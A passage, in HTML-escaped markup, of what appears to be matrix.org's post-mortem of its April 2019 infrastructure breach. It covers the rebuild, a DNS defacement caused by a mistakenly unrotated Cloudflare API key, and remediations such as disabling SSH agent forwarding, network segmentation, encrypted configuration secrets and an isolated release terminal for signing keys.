&lt;li&gt;There was no evidence of large-scale data exfiltration, based on analysing network logs.&lt;&#x2F;li&gt;
&lt;li&gt;There was no evidence of Modular.im hosts having been compromised.  (Modular’s provisioning system and DB did run on the old infrastructure, but it was not used to tamper with the modular instances themselves).&lt;&#x2F;li&gt;
&lt;li&gt;There was no evidence of the identity server databases having been compromised.&lt;&#x2F;li&gt;
&lt;li&gt;There was no evidence of tampering in our source code repositories.&lt;&#x2F;li&gt;
&lt;li&gt;There was no evidence of tampering of our distributed software packages.&lt;&#x2F;li&gt;
&lt;li&gt;Two more hosts were compromised on Apr 5th by similarly hijacking another developer SSH agent as the dev logged into a production server.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;By around 2am on Apr 11th we felt that we had sufficient visibility on the attacker’s behaviour to be able to do a first pass at evicting them by locking down SSH, removing their keys, and blocking as much network traffic as we could.&lt;&#x2F;p&gt;
&lt;p&gt;We then started a full rebuild of the datacenter on the morning of Apr 11th, given that the only responsible course of action when an attacker has acquired root is to salt the earth and start over afresh. This meant rotating all secrets; isolating the old hosts entirely (including ones which appeared to not have been compromised, for safety), spinning up entirely new hosts, and redeploying everything from scratch with the fresh secrets.  The process was significantly slowed down by colliding with unplanned maintenance and provisioning issues in the datacenter provider and unexpected delays spent waiting to copy data volumes between datacenters, but by 1am on Apr 12th the core matrix.org server was back up, and we had enough of a website up to publish the initial &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;04&#x2F;11&#x2F;security-incident&#x2F;&quot;&gt;security incident blog post&lt;&#x2F;a&gt;. (This was actually static HTML, faked by editing the generated WordPress content from the old website. We opted not to transition any WordPress deployments to the new infra, in a bid to keep our attack surface as small as possible going forwards).&lt;&#x2F;p&gt;
&lt;p&gt;Given the production database had been accessed, we had no choice but drop all access_tokens for matrix.org, to stop the attacker accessing user accounts, causing a forced logout for all users on the server.  We also recommended all users change their passwords, given the salted &amp;amp; hashed (4096 rounds of bcrypt) passwords had likely been exfiltrated.&lt;&#x2F;p&gt;
&lt;p&gt;At about 4am we had enough of the bare necessities back up and running to pause for sleep.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;the-defacement&quot;&gt;The Defacement&lt;&#x2F;h3&gt;
&lt;p&gt;At around 7am, we were woken up to the news that the attacker had managed to replace the matrix.org website with a defacement (as per &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;9435&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;9435&lt;&#x2F;a&gt;). It looks like the attacker didn’t think we were being transparent enough in our initial blog post, and wanted to make it very clear that they had access to many hosts, including the production database and had indeed exfiltrated password hashes.  Unfortunately it took a few hours for the defacement to get on our radar as our monitoring infrastructure hadn’t yet been fully restored and the normal paging infrastructure wasn’t back up (we now have emergency-emergency-paging for this eventuality).&lt;&#x2F;p&gt;
&lt;p&gt;On inspection, it transpired that the attacker had not compromised the new infrastructure, but had used Cloudflare to repoint the DNS for matrix.org to a defacement site hosted on Github.  Now, as part of rotating the secrets which had been compromised via our configuration repositories, we had of course rotated the Cloudflare API key (used to automate changes to our DNS) during the rebuild on Apr 11.  When you log into Cloudflare, it looks something like this...&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;cf.png&quot; alt=&quot;Cloudflare login UI&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;...where the top account is your personal one, and the bottom one is an admin role account.  To rotate the admin API key, we clicked on the admin account to log in as the admin, and then went to the Profile menu, found the API keys and hit the &lt;a href=&quot;https:&#x2F;&#x2F;support.cloudflare.com&#x2F;hc&#x2F;en-us&#x2F;articles&#x2F;221318707-How-do-I-change-my-Global-API-Key-&quot;&gt;Change API Key&lt;&#x2F;a&gt; button.&lt;&#x2F;p&gt;
&lt;p&gt;Unfortunately, when you do this, it turns out that the API Key it changes is your personal one, rather than the admin one.  As a result, in our rush we thought we’d rotated the admin API key, but we hadn’t, thus accidentally enabling the defacement.&lt;&#x2F;p&gt;
&lt;p&gt;To flush out the defacement we logged in directly as the admin user and changed the API key, pointed the DNS back at the right place, and continued on with the rebuild.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;the-rebuild&quot;&gt;The Rebuild&lt;&#x2F;h3&gt;
&lt;p&gt;The goal of the rebuild has been to get all the higher priority services back up rapidly - whilst also ensuring that good security practices are in place going forwards.  In practice, this meant making some immediate decisions about how to ensure the new infrastructure did not suffer the same issues and fate as the old.  Firstly, we ensured the most obvious mistakes that made the breach possible were mitigated:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Access via SSH restricted as heavily as possible&lt;&#x2F;li&gt;
&lt;li&gt;SSH agent forwarding disabled server-side&lt;&#x2F;li&gt;
&lt;li&gt;All configuration to be managed by Ansible, with secrets encrypted in vaults, rather than sitting in a git repo.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Then, whilst reinstating services on the new infra, we opted to review &lt;strong&gt;everything&lt;&#x2F;strong&gt; being installed for security risks, replacing with securer alternatives if needed, even if it slowed down the rebuild.  Particularly, this meant:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Jenkins has been replaced by &lt;a href=&quot;https:&#x2F;&#x2F;buildkite.com&#x2F;matrix-dot-org&quot;&gt;Buildkite&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Wordpress has been replaced by static generated sites (e.g. &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;tree&#x2F;master&#x2F;gatsby&quot;&gt;Gatsby&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;cgit has been replaced by &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&quot;&gt;gitlab&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Entirely new packaging building, signing &amp;amp; distribution infrastructure (more on that later)&lt;&#x2F;li&gt;
&lt;li&gt;etc.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Now, while we restored the main synapse (homeserver), sydent (identity server), sygnal (push server), databases, load balancers, intranet and website on Apr 11, it’s important to understand that there were over 100 other services running on the infra - which is why it is taking a while to get full parity with where we were before.&lt;&#x2F;p&gt;
&lt;p&gt;In the interest of transparency (and to try to give a sense of scale of the impact of the breach), here is the public-facing service list we restored, showing priority (1 is top, 4 is bottom) and the % restore status as of May 4th:&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;blog&#x2F;img&#x2F;services.png&quot; alt=&quot;Service status&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Apologies again that it took longer to get some of these services back up than we’d preferred (and that there are still a few pending).  Once we got the top priority ones up, we had no choice but to juggle the remainder alongside remediation work, &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;03&#x2F;security-updates-sydent-1-0-3-synapse-0-99-3-1-and-riot-android-0-9-0-0-8-99-0-8-28-a&#x2F;&quot;&gt;other security work&lt;&#x2F;a&gt;, and actually working on Matrix(!), whilst ensuring that the services we restored were being restored securely.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;remediations&quot;&gt;Remediations&lt;&#x2F;h3&gt;
&lt;p&gt;Once the majority of the P1 and P2 services had been restored, on Apr 24 we held a formal retrospective for the team on the whole incident, which in turn kicked off a full security audit over the entirety of our infrastructure and operational processes.&lt;&#x2F;p&gt;
&lt;p&gt;We’d like to share the resulting remediation plan in as much detail as possible, in order to show the approach we are taking, and in case it helps others avoid repeating the mistakes of our past. Inevitably we’re going to have to skip over some of the items, however - after all, remediations imply that there’s something that could be improved, and for obvious reasons we don’t want to dig into areas where remediation work is still ongoing.  We will aim to provide an update on these once ongoing work is complete, however.&lt;&#x2F;p&gt;
&lt;p&gt;We should also acknowledge that after being removed from the infra, the attacker chose to file a &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;issues&#x2F;371&quot;&gt;set of Github issues&lt;&#x2F;a&gt; on Apr 12 to highlight some of the security issues that had taken advantage of during the breach.  Their actions matched the findings from our forensics on Apr 10, and their suggested remediations aligned with our plan.&lt;&#x2F;p&gt;
&lt;p&gt;We’ve split the remediation work into the following domains.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;ssh&quot;&gt;SSH&lt;&#x2F;h4&gt;
&lt;p&gt;Some of the biggest issues exposed by the security breach concerned our use of SSH, which we’ll take in turn:&lt;&#x2F;p&gt;
&lt;h5 id=&quot;ssh-agent-forwarding-should-be-disabled&quot;&gt;SSH agent forwarding should be disabled.&lt;&#x2F;h5&gt;
&lt;p&gt;SSH agent forwarding is a beguilingly convenient mechanism which allows a user to ‘forward’ access to their private SSH keys to a remote server whilst logged in, so they can in turn access other servers via SSH from that server.  Typical uses are to make it easy to copy files between remote servers via scp or rsync, or to interact with a SCM system such as Github via SSH from a remote server.  Your private SSH keys end up available for use by the server for as long as you are logged into it, letting the server impersonate you.&lt;&#x2F;p&gt;
&lt;p&gt;The common wisdom on this tends to be something like: “Only use agent forwarding when connecting to trusted hosts”.  For instance, &lt;a href=&quot;https:&#x2F;&#x2F;developer.github.com&#x2F;v3&#x2F;guides&#x2F;using-ssh-agent-forwarding&#x2F;#setting-up-ssh-agent-forwarding&quot;&gt;Github’s guide to using SSH agent forwarding&lt;&#x2F;a&gt; says: &lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Warning&lt;&#x2F;strong&gt;: You may be tempted to use a wildcard like &lt;code&gt;Host *&lt;&#x2F;code&gt; to just apply this setting (ForwardAgent: yes) to all SSH connections. That&#x27;s not really a good idea, as you&#x27;d be sharing your local SSH keys with &lt;em&gt;every&lt;&#x2F;em&gt; server you SSH into. They won&#x27;t have direct access to the keys, but they will be able to use them &lt;em&gt;as you&lt;&#x2F;em&gt; while the connection is established. &lt;strong&gt;You should only add servers you trust and that you intend to use with agent forwarding&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;As a result, several of the team doing ops work had set &lt;code&gt;Host *.matrix.org ForwardAgent: yes&lt;&#x2F;code&gt; in their ssh client configs, thinking “well, what &lt;em&gt;can&lt;&#x2F;em&gt; we trust if not our own servers?”&lt;&#x2F;p&gt;
&lt;p&gt;This was a massive, massive mistake.&lt;&#x2F;p&gt;
&lt;p&gt;If there is one lesson everyone should learn from this whole mess, it is: &lt;strong&gt;SSH agent forwarding is incredibly unsafe, and in general you should never use it.&lt;&#x2F;strong&gt;  Not only can malicious code running on the server as that user (or root) hijack your credentials, but your credentials can in turn be used to access hosts behind your network perimeter which might otherwise be inaccessible.  All it takes is someone to have snuck malicious code on your server waiting for you to log in with a forwarded agent, and &lt;em&gt;boom&lt;&#x2F;em&gt;, even if it was just a one-off &lt;code&gt;ssh -A&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Our remediations for this are:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Disable all ssh agent forwarding on the servers.&lt;&#x2F;li&gt;
&lt;li&gt;If you need to jump through a box to ssh into another box, use &lt;code&gt;ssh -J $host&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;This can also be used with rsync via &lt;code&gt;rsync -e &amp;quot;ssh -J $host&amp;quot;&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;If you need to copy files between machines, use rsync rather than scp (OpenSSH 8.0’s &lt;a href=&quot;https:&#x2F;&#x2F;www.openssh.com&#x2F;txt&#x2F;release-8.0&quot;&gt;release notes&lt;&#x2F;a&gt; explicitly recommends using more modern protocols than scp).&lt;&#x2F;li&gt;
&lt;li&gt;If you need to regularly copy stuff from server to another (or use SSH to GitHub to check out something from a private repo), it might be better to have a specific SSH ‘deploy key’ created for this, stored server-side and only able to perform limited actions.&lt;&#x2F;li&gt;
&lt;li&gt;If you just need to check out stuff from public git repos, use https rather than git+ssh.&lt;&#x2F;li&gt;
&lt;li&gt;Try to educate everyone on the perils of SSH agent forwarding: if our past selves can’t be a good example, they can at least be a horrible warning...&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Another approach could be to allow forwarding, but configure your SSH agent to prompt whenever a remote app tries to access your keys.  However, not all agents support this (OpenSSH’s does via &lt;code&gt;ssh-add -c&lt;&#x2F;code&gt;, but gnome-keyring for instance doesn’t), and also it might still be possible for a hijacker to race with the valid request to hijack your credentials.&lt;&#x2F;p&gt;
&lt;h5 id=&quot;ssh-should-not-be-exposed-to-the-general-internet&quot;&gt;SSH should not be exposed to the general internet&lt;&#x2F;h5&gt;
&lt;p&gt;Needless to say, SSH is no longer exposed to the general internet.  We are rolling out a VPN as the main access to dev network, and then SSH bastion hosts to be the only access point into production, using SSH keys to restrict access to be as minimal as possible.&lt;&#x2F;p&gt;
&lt;h5 id=&quot;ssh-keys-should-give-minimal-access&quot;&gt;SSH keys should give minimal access&lt;&#x2F;h5&gt;
&lt;p&gt;Another major problem factor was that individual SSH keys gave very broad access. We have gone through ensuring that SSH keys grant the least privilege required to the users in question. Particularly, root login should not be available over SSH.&lt;&#x2F;p&gt;
&lt;p&gt;A typical scenario where users might end up with unnecessary access to production are developers who simply want to push new code or check its logs.  We are mitigating this by switching over to using continuous deployment infrastructure everywhere rather than developers having to actually SSH into production.  For instance, the new &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&quot;&gt;matrix.org blog&lt;&#x2F;a&gt; is continuously deployed into production by Buildkite from &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&quot;&gt;GitHub&lt;&#x2F;a&gt; without anyone needing to SSH anywhere.  Similarly, logs should be available to developers from a logserver in real time, without having to SSH into the actual production host. We’ve already been experimenting internally with sentry for this.&lt;&#x2F;p&gt;
&lt;p&gt;Relatedly, we’ve also shifted to requiring multiple SSH keys per user (per device, and for privileged &#x2F; unprivileged access), to have finer grained granularity over locking down their permissions and revoking them etc.  (We had actually already started this process, and while it didn’t help prevent the attack, it did assist with forensics).&lt;&#x2F;p&gt;
&lt;h5 id=&quot;two-factor-authentication&quot;&gt;Two factor authentication&lt;&#x2F;h5&gt;
&lt;p&gt;We are rolling out two-factor authentication for SSH to ensure that even if keys are compromised (e.g. via forwarding hijack), the attacker needs to have also compromised other physical tokens in order to successfully authenticate.&lt;&#x2F;p&gt;
&lt;h5 id=&quot;it-should-be-made-as-hard-as-possible-to-add-malicious-ssh-keys&quot;&gt;It should be made as hard as possible to add malicious SSH keys&lt;&#x2F;h5&gt;
&lt;p&gt;We’ve decided to stop users from being able to directly manage their own SSH keys in production via &lt;code&gt;~&#x2F;.ssh&#x2F;authorized_keys&lt;&#x2F;code&gt; (or &lt;code&gt;~&#x2F;.ssh&#x2F;authorized_keys2&lt;&#x2F;code&gt; for that matter) - we can see no benefit from letting non-root users set keys.&lt;&#x2F;p&gt;
&lt;p&gt;Instead, keys for all accounts are managed exclusively by Ansible via &lt;code&gt;&#x2F;etc&#x2F;ssh&#x2F;authorized_keys&#x2F;$account&lt;&#x2F;code&gt; (using sshd’s &lt;code&gt;AuthorizedKeysFile &#x2F;etc&#x2F;ssh&#x2F;authorized_keys&#x2F;%u&lt;&#x2F;code&gt; directive).&lt;&#x2F;p&gt;
&lt;h5 id=&quot;changes-to-ssh-keys-should-be-carefully-monitored&quot;&gt;Changes to SSH keys should be carefully monitored&lt;&#x2F;h5&gt;
&lt;p&gt;If we’d had sufficient monitoring of the SSH configuration, the breach could have been caught instantly.  We are doing this by managing the keys exclusively via Ansible, and also improving our intrusion detection in general.&lt;&#x2F;p&gt;
&lt;p&gt;Similarly, we are working on tracking changes and additions to other credentials (and enforcing their complexity).&lt;&#x2F;p&gt;
&lt;h5 id=&quot;ssh-config-should-be-hardened-disabling-unnecessary-options&quot;&gt;SSH config should be hardened, disabling unnecessary options&lt;&#x2F;h5&gt;
&lt;p&gt;If we’d gone through reviewing the default sshd config when we set up the datacenter in the first place, we’d have caught several of these failure modes at the outset.  We’ve now done so (as per above).&lt;&#x2F;p&gt;
&lt;p&gt;We’d like to recommend that packages of openssh start having secure-by-default configurations, as a number of the old options just don’t need to exist on most newly provisioned machines. &lt;&#x2F;p&gt;
&lt;h4 id=&quot;network-architecture&quot;&gt;Network architecture&lt;&#x2F;h4&gt;
&lt;p&gt;As mentioned in the History section, the legacy network infrastructure effectively grew organically, without really having a core network or a good split between different production environments.&lt;&#x2F;p&gt;
&lt;p&gt;We are addressing this by:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Splitting our infrastructure into strictly separated service domains, which are firewalled from each other and can only access each other via their respective ‘front doors’ (e.g. HTTPS APIs exposed at the loadbalancers).
&lt;ul&gt;
&lt;li&gt;Development&lt;&#x2F;li&gt;
&lt;li&gt;Intranet&lt;&#x2F;li&gt;
&lt;li&gt;Package Build (airgapped; see below for more details)&lt;&#x2F;li&gt;
&lt;li&gt;Package Distribution&lt;&#x2F;li&gt;
&lt;li&gt;Production, which is in turn split per class of service.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Access to these networks will be via VPN + SSH jumpboxes (as per above).  Access to the VPN is via per-device certificate + 2FA, and SSH via keys as per above.&lt;&#x2F;li&gt;
&lt;li&gt;Switching to an improved internal VPN between hosts within a given network environment (i.e. we don’t trust the datacenter LAN).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We’re also running most services in containers by default going forwards (previously it was a bit of a mix of running unix processes, VMs, and occasional containers), providing an additional level of namespace isolation. &lt;&#x2F;p&gt;
&lt;h4 id=&quot;keeping-patched&quot;&gt;Keeping patched&lt;&#x2F;h4&gt;
&lt;p&gt;Needless to say, this particular breach would not have happened had we kept the public-facing Jenkins patched (although there would of course still have been scope for a 0-day attack).&lt;&#x2F;p&gt;
&lt;p&gt;Going forwards, we are establishing a formal regular process for deploying security updates rather than relying on spotting security advisories on an ad hoc basis. We are now also setting up regular vulnerability scans against production so we catch any gaps before attackers do.&lt;&#x2F;p&gt;
&lt;p&gt;Aside from our infrastructure, we’re also extending the process of regularly checking for security updates to also checking for outdated dependencies in our distributed software (Riot, Synapse, etc) too, given the discipline to regularly chase outdated software applies equally to both.&lt;&#x2F;p&gt;
&lt;p&gt;Moving all our machine deployment and configuration into Ansible allows this to be a much simpler task than before.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;intrusion-detection&quot;&gt;Intrusion detection&lt;&#x2F;h4&gt;
&lt;p&gt;There’s obviously a lot we need to do in terms of spotting future attacks as rapidly as possible.  Amongst other strategies, we’re working on real-time log analysis for aberrant behaviour.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;incident-management&quot;&gt;Incident management&lt;&#x2F;h4&gt;
&lt;p&gt;There is much we have learnt from managing an incident at this scale. The main highlights taken from our internal retrospective are:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;The need for a single incident manager to coordinate the technical response and coordinate prioritisation and handover between those handling the incident. (We lacked a single incident manager at first, given several of the team started off that week on holiday...)&lt;&#x2F;li&gt;
&lt;li&gt;The benefits of gathering all relevant info and checklists onto a canonical set of shared documents rather than being spread across different chatrooms and lost in scrollback.&lt;&#x2F;li&gt;
&lt;li&gt;The need to have an existing inventory of services and secrets available for tracking progress and prioritisation&lt;&#x2F;li&gt;
&lt;li&gt;The need to have a general incident management &lt;a href=&quot;https:&#x2F;&#x2F;news.ycombinator.com&#x2F;item?id=19682451&amp;amp;p=2&quot;&gt;checklist&lt;&#x2F;a&gt; for future reference, which folks can familiarise themselves with ahead of time to avoid stuff getting forgotten.  The sort of stuff which will go on our checklist in future includes:
&lt;ul&gt;
&lt;li&gt;Remembering to appoint named incident manager, external comms manager &amp;amp; internal comms manager. (They could of course be the same person, but the roles are distinct).&lt;&#x2F;li&gt;
&lt;li&gt;Defining a sensible sequence of forensics, mitigations, communication, rotating secrets etc is followed rather than having to work it out on the fly and risk forgetting stuff&lt;&#x2F;li&gt;
&lt;li&gt;Remembering to informing the ICO (Information Commissioner Office) of any user data breaches&lt;&#x2F;li&gt;
&lt;li&gt;Guidelines on how to balance between forensics and rebuilding (i.e. how long to spend on forensics, if at all, before pulling the plug)&lt;&#x2F;li&gt;
&lt;li&gt;Reminders to snapshot systems for forensics &amp;amp; backups&lt;&#x2F;li&gt;
&lt;li&gt;Reminder to not redesign infrastructure during a rebuild.  There were a few instances where we lost time by seizing the opportunity to try to fix design flaws whilst rebuilding, some of which were avoidable.&lt;&#x2F;li&gt;
&lt;li&gt;Making sure that communication isn’t sent prematurely to users (e.g. we posted the blog post asking people to update their passwords before password reset had actually been restored - apologies for that.)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4 id=&quot;configuration-management&quot;&gt;Configuration management&lt;&#x2F;h4&gt;
&lt;p&gt;One of the major flaws once the attacker was in our network was that our internal configuration git repo was cloned on most accounts on most servers, containing within it a plethora of unencrypted secrets.  Config would then get symlinked from the checkout to wherever the app or OS needed it.&lt;&#x2F;p&gt;
&lt;p&gt;This is bad in terms of leaving unencrypted secrets (database passwords, API keys etc) lying around everywhere, but also in terms of being able to automatically maintain configuration and spot unauthorised configuration changes.&lt;&#x2F;p&gt;
&lt;p&gt;Our solution is to switch all configuration management, from the OS upwards, to Ansible (which we had already established for Modular.im), using Ansible vaults to store the encrypted secrets.  It’s unfortunate that we had already done the work for this (and even had been &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ansible-community&#x2F;ansible-london-meetup&#x2F;blob&#x2F;master&#x2F;presentations&#x2F;2019-01-31&#x2F;Introducing%20Ansible%20to%20matrix-final.pdf&quot;&gt;giving talks at Ansible meetups&lt;&#x2F;a&gt; about it!) but had not yet applied it to the legacy infrastructure.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;avoiding-temporary-measures-which-last-forever&quot;&gt;Avoiding temporary measures which last forever&lt;&#x2F;h4&gt;
&lt;p&gt;None of this would have happened had we been more disciplined in finishing off the temporary infrastructure from back in 2017.  As a general point, we should try and do it right the first time - and failing that, assign responsibility to someone to update it and assign responsibility to someone else to check. In other words, the only way to dig out of temporary measures like this is to project manage the update or it will not happen.  This is of course a general point not specific to this incident, but one well worth reiterating.&lt;&#x2F;p&gt;
&lt;h4 id=&quot;secure-packaging&quot;&gt;Secure packaging&lt;&#x2F;h4&gt;
&lt;p&gt;One of the most unfortunate mistakes highlighted by the breach is that the signing keys for the Synapse debian repository, Riot debian repository and Riot&#x2F;Android releases on the Google Play Store had ended up on hosts which were compromised during the attack.  This is obviously a massive fail, and is a case of the geo-distributed dev teams prioritising the convenience of a near-automated release process without thinking through the security risks of storing keys on a production server.&lt;&#x2F;p&gt;
&lt;p&gt;Whilst the keys were compromised, none of the packages that we distribute were tampered with. However, the impact on the project has been high - particularly for Riot&#x2F;Android, as we cannot allow the risk of an attacker using the keys to sign and somehow distribute malicious variants of Riot&#x2F;Android, and Google provides no means of recovering from a compromised signing key beyond creating a whole new app and starting over.  Therefore we have lost all our ratings, reviews and download counts on Riot&#x2F;Android and &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;riot-im-android-security-update-2b3f655ad739&quot;&gt;started over&lt;&#x2F;a&gt;.  (If you want to give the newly released app a fighting chance despite this setback, feel free to &lt;a href=&quot;https:&#x2F;&#x2F;play.google.com&#x2F;store&#x2F;apps&#x2F;details?id=im.vector.app&amp;amp;showAllReviews=true&quot;&gt;give it some stars&lt;&#x2F;a&gt; on the Play Store). We also revoked the compromised Synapse &amp;amp; Riot GPG keys and created new ones (and published &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;commit&#x2F;95c603ae6f0f1639f6299fff62d7a75002221276#diff-7d442b7eb49f5fc377f51e74b291cfc1&quot;&gt;new instructions&lt;&#x2F;a&gt; for how to securely set up your Synapse or Riot debian repos).&lt;&#x2F;p&gt;
&lt;p&gt;In terms of remediation, designing a secure build process is surprisingly hard, particularly for a geo-distributed team.  What we have landed on is as follows:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Developers create a release branch to signify a new release (ensuring dependencies are pinned to known good versions).&lt;&#x2F;li&gt;
&lt;li&gt;We then perform all releases from a dedicated isolated release terminal.
&lt;ul&gt;
&lt;li&gt;This is a device which is kept disconnected from the internet, other than when doing a release, and even then it is firewalled to be able to pull data from SCM and push to the package distribution servers, but otherwise entirely isolated from the network.&lt;&#x2F;li&gt;
&lt;li&gt;Needless to say, the device is strictly used for &lt;em&gt;nothing&lt;&#x2F;em&gt; other than performing releases.&lt;&#x2F;li&gt;
&lt;li&gt;The build environment installation is scripted and installs on a fresh OS image (letting us easily build new release terminals as needed)&lt;&#x2F;li&gt;
&lt;li&gt;The signing keys (hardware or software) are kept exclusively on this device.&lt;&#x2F;li&gt;
&lt;li&gt;The publishing SSH keys (hardware or software) used to push to the packaging servers are kept exclusively on this device.&lt;&#x2F;li&gt;
&lt;li&gt;We physically store the device securely.&lt;&#x2F;li&gt;
&lt;li&gt;We ensure someone on the team always has physical access to it in order to do emergency builds.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Meanwhile, releases are distributed using dedicated infrastructure, entirely isolated from the rest of production.
&lt;ul&gt;
&lt;li&gt;These live at &lt;a href=&quot;https:&#x2F;&#x2F;packages.matrix.org&quot;&gt;https:&#x2F;&#x2F;packages.matrix.org&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;packages.riot.im&quot;&gt;https:&#x2F;&#x2F;packages.riot.im&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;These are minimal machines with nothing but a static web-server.&lt;&#x2F;li&gt;
&lt;li&gt;They are accessed only via the dedicated SSH keys stored on the release terminal.&lt;&#x2F;li&gt;
&lt;li&gt;These in turn can be mirrored in future to avoid a SPOF (or we could cheat and use Cloudflare’s &lt;a href=&quot;https:&#x2F;&#x2F;www.cloudflare.com&#x2F;always-online&#x2F;&quot;&gt;always online&lt;&#x2F;a&gt; feature, for better or worse).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Alternatives here included:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;In an ideal world we’d do reproducible builds instead, and sign the build’s hash with a hardware key, but given we don’t have reproducible builds yet this will have to suffice for now.&lt;&#x2F;li&gt;
&lt;li&gt;We could delegate building and distribution entirely to a 3rd party setup such as OBS (as per &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;issues&#x2F;370&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix.org&#x2F;issues&#x2F;370&lt;&#x2F;a&gt;).  However, we have a very wide range of artefacts to build across many different platforms and OSes, so would rather build ourselves if we can.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4 id=&quot;dev-and-ci-infrastructure&quot;&gt;Dev and CI infrastructure&lt;&#x2F;h4&gt;
&lt;p&gt;The main change in our dev and CI infrastructure is to move from Jenkins to &lt;a href=&quot;https:&#x2F;&#x2F;buildkite.com&#x2F;matrix-dot-org&quot;&gt;Buildkite&lt;&#x2F;a&gt;.  The latter has been serving us well for Synapse builds over the last few months, and has now been extended to serve all the main CI pipelines that Jenkins was providing.  Buildkite works by orchestrating jobs on a elastic pool of CI workers we host in our own AWS, and so far has done so quite painlessly.&lt;&#x2F;p&gt;
&lt;p&gt;The new pipelines have been set up so that where CI needs to push artefacts to production for continuous deployment (e.g. &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2019&#x2F;05&#x2F;08&#x2F;post-mortem-and-remediations-for-apr-11-security-incident&#x2F;riot.im&#x2F;develop&quot;&gt;riot.im&#x2F;develop&lt;&#x2F;a&gt;), it does so by poking production via HTTPS to trigger production to pull the artefact from CI, rather than pushing the artefact via SSH to production.&lt;&#x2F;p&gt;
&lt;p&gt;Other than CI, our strategy is:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Continue using Github for public repositories&lt;&#x2F;li&gt;
&lt;li&gt;Use gitlab.matrix.org for private repositories (and stuff which we don’t want to re-export via the US, like &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&quot;&gt;Olm&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;li&gt;Continue to host docker images on Docker Hub (despite their recent &lt;a href=&quot;https:&#x2F;&#x2F;success.docker.com&#x2F;article&#x2F;docker-hub-user-notification&quot;&gt;security dramas&lt;&#x2F;a&gt;).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h4 id=&quot;log-minimisation-and-handling-personally-identifying-information-pii&quot;&gt;Log minimisation and handling Personally Identifying Information (PII)&lt;&#x2F;h4&gt;
